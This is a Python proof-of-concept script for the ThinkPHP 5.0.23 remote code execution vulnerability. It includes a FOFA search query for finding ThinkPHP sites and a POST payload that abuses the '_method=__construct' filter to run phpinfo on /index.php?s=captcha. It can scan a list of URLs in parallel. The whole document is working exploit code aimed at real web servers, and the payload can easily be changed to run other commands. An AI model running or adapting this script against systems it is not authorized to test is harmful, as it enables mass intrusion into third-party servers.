#FOFA: body="thinkphp" | app="thinkphp" | icon_hash="1165838194"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        target = target + '/index.php?s=captcha'
        target = urllib.parse.urljoin(target, '/index.php?s=captcha')
        payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        response = requests.post(target, data=payload, timeout=3, verify=False, headers=headers)
        response2 = requests.post(target, timeout=3, verify=False, headers=headers)
        if re.search(r'PHP Version', response.text) and not re.search(r'PHP Version', response2.text):
            result['vulnerable'] = True
            result['method'] = 'POST'
            result['url'] = target
            result['position'] = 'data'
            result['payload'] = payload
            print(result)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("Thinkphp5 5.0.23版本 代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()